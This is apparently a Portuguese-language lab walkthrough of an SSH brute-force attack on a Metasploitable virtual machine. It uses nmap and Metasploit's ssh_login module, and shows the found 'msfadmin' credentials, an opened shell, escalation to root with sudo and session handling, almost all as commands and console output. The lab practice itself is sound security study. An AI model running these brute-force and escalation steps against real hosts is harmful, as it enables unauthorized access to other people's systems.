# Ataque de força bruta - ssh

O ssh um protocolo de rede criptografado usado para acessar e administrar computadores de forma remota, principalmente em servidores Linux e Unix.

```
nmap -sV 192.168.1.33

Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-21 22:55 -03
Nmap scan report for 192.168.1.33
Host is up (0.00014s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
...
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:C7:CF:C6 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.53 seconds
```

O serviço de ssh usa a porta 22 com o serviço. Vamos tentar descobrir user e senha de login a partir de uma lista de users e senhas comuns.

Procurando um 'exploit' de força bruta para o ssh. Ressalta-se que os ataques de força brura estão no módulo auxiliary.

```
msf6 > search auxiliary ssh login

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank    Check  Description
   -  ----                                                  ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/apache_karaf_command_execution  2016-02-09       normal  No     Apache Karaf Default Credentials Command Execution
   1  auxiliary/scanner/ssh/karaf_login                     .                normal  No     Apache Karaf Login Utility
   2  auxiliary/scanner/ssh/cerberus_sftp_enumusers         2014-05-27       normal  No     Cerberus FTP Server SFTP Username Enumeration
   3  auxiliary/scanner/http/cisco_firepower_login          .                normal  No     Cisco Firepower Management Console 6.0 Login
   4  auxiliary/scanner/ssh/ssh_login                       .                normal  No     SSH Login Check Scanner
   5  auxiliary/scanner/ssh/ssh_login_pubkey                .                normal  No     SSH Public Key Login Scanner                                                                                              

Interact with a module by name or index. For example info 5, use 5 or use auxiliary/scanner/ssh/ssh_login_pubkey  
```
Da lista, o 'auxiliary/scanner/ssh/ssh_login' parece ser o que estamos procurando. Assim, vamos obter mais informações do 'exploit':

```
msf6 > show info auxiliary/scanner/ssh/ssh_login  

       Name: SSH Login Check Scanner
     Module: auxiliary/scanner/ssh/ssh_login
    License: Metasploit Framework License (BSD)
       Rank: Normal

Provided by:
  todb <todb@metasploit.com>

Check supported:
  No

Basic options:
  Name              Current Setting  Required  Description
  ----              ---------------  --------  -----------
  ANONYMOUS_LOGIN   false            yes       Attempt to login with a blank username and password
  BLANK_PASSWORDS   false            no        Try blank passwords for all users
  BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
  CreateSession     true             no        Create a new session for every successful login
  DB_ALL_CREDS      false            no        Try each user/password couple stored in the current databa
                                               se
  DB_ALL_PASS       false            no        Add all passwords in the current database to the list
  DB_ALL_USERS      false            no        Add all users in the current database to the list
  DB_SKIP_EXISTING  none             no        Skip existing credentials stored in the current database (
                                               Accepted: none, user, user&realm)
  PASSWORD                           no        A specific password to authenticate with
  PASS_FILE                          no        File containing passwords, one per line
  RHOSTS                             yes       The target host(s), see https://docs.metasploit.com/docs/u
                                               sing-metasploit/basics/using-metasploit.html
  RPORT             22               yes       The target port
  STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
  THREADS           1                yes       The number of concurrent threads (max one per host)
  USERNAME                           no        A specific username to authenticate as
  USERPASS_FILE                      no        File containing users and passwords separated by space, on
                                               e pair per line
  USER_AS_PASS      false            no        Try the username as the password for all users
  USER_FILE                          no        File containing usernames, one per line
  VERBOSE           false            yes       Whether to print output for all attempts

Description:
  This module will test ssh logins on a range of machines and
  report successful logins.  If you have loaded a database plugin
  and connected to a database this module will record successful
  logins and hosts so you can track your access.

References:
  https://nvd.nist.gov/vuln/detail/CVE-1999-0502


View the full module info with the info -d command.
```
É exatamente o que estávamos procurando. Agora vamos configurá-lo, lembrando que o RPORT já está configurado corretamente para a porta 22:

*Observação: como esse é um ataque demorado, podendo levar horas, dias, semanas... a depender dos arquivos de users e senhas, criamos um arquivo de tamanho pequeno com o username e senha msfadmin.*

```
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOST 192.168.1.33
RHOST => 192.168.1.33

msf6 auxiliary(scanner/ssh/ssh_login) > set user_file /home/OpsShadow/Documentos/senhas.txt
user_file => /home/OpsShadow/Documentos/senhas.txt

msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /home/OpsShadow/Documentos/senhas.txt
pass_file => /home/OpsShadow/Documentos/senhas.txt
```
Fazendo uma última verificação:

```
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting             Required  Description
   ----              ---------------             --------  -----------
   ANONYMOUS_LOGIN   false                       yes       Attempt to login with a blank username and pas
                                                           sword
   BLANK_PASSWORDS   false                       no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                           yes       How fast to bruteforce, from 0 to 5
   CreateSession     true                        no        Create a new session for every successful logi
                                                           n
   DB_ALL_CREDS      false                       no        Try each user/password couple stored in the cu
                                                           rrent database
   DB_ALL_PASS       false                       no        Add all passwords in the current database to t
                                                           he list
   DB_ALL_USERS      false                       no        Add all users in the current database to the l
                                                           ist
   DB_SKIP_EXISTING  none                        no        Skip existing credentials stored in the curren
                                                           t database (Accepted: none, user, user&realm)
   PASSWORD                                      no        A specific password to authenticate with
   PASS_FILE         /home/OpsShadow/Documentos  no        File containing passwords, one per line
                     /senhas.txt
   RHOSTS            192.168.1.33                yes       The target host(s), see https://docs.metasploi
                                                           t.com/docs/using-metasploit/basics/using-metas
                                                           ploit.html
   RPORT             22                          yes       The target port
   STOP_ON_SUCCESS   false                       yes       Stop guessing when a credential works for a ho
                                                           st
   THREADS           1                           yes       The number of concurrent threads (max one per
                                                           host)
   USERNAME                                      no        A specific username to authenticate as
   USERPASS_FILE                                 no        File containing users and passwords separated
                                                           by space, one pair per line
   USER_AS_PASS      false                       no        Try the username as the password for all users
   USER_FILE         /home/OpsShadow/Documentos  no        File containing usernames, one per line
                     /senhas.txt
   VERBOSE           false                       yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.
```
Está tudo certo e pronto para executar.

```
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 192.168.1.33:22 - Starting bruteforce
[+] 192.168.1.33:22 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux '
[*] SSH session 1 opened (192.168.1.10:36229 -> 192.168.1.33:22) at 2025-08-21 23:31:55 -0300
```
Para verificar as sessões e engajar na sessão aberta no ssh:

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH root @   192.168.1.10:36229 -> 192.168.1.33:22 (192.168.1.33)
```
```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[*] Starting interaction with 1...

whoami
msfadmin

sudo su
[sudo] password for msfadmin: msfadmin

whoami
root

background

Background session 1? [y/N]  y
```
Para encerrar uma sessão:

```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information  Connection
  --  ----  ----         -----------  ----------
  1         shell linux  SSH root @   192.168.1.10:36229 -> 192.168.1.33:22 (192.168.1.33)
```
```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -k 1
[*] Killing the following session(s): 1
[*] Killing session 1
[*] 192.168.1.33 - SSH session 1 closed.
```
